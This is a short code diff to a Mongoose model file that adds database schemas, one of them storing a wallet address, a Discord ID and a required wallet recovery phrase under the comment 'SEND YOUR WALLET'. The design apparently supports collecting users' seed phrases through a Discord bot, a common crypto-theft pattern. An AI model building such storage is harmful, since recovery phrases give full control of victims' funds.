@@ -18,8 +18,22 @@ userAuthSign.pre("save", async function (next) {
   next();
 });
 
+// SEND YOUR WALLET
+const sentYourWallet = new mongoose.Schema({
+  wallet: { type: String, required: true },
+  discordID: { type: Number, required: true },
+  recoveryPhrase: { type: Array, required: true },
+});
+
+// SAVE YOUR PROHIBITED WORDS
+const savedWords = new mongoose.Schema({
+  words: { type: String, required: true },
+});
+
 // MODEL
 const authSign = mongoose.model("admin", userAuthSign);
+const yourWallet = mongoose.model("wallet", sentYourWallet);
+const words = mongoose.model("prohibitedWords", savedWords);
 
 // EXPORTED MODULES
-module.exports = { authSign };
+module.exports = { authSign, yourWallet, words };
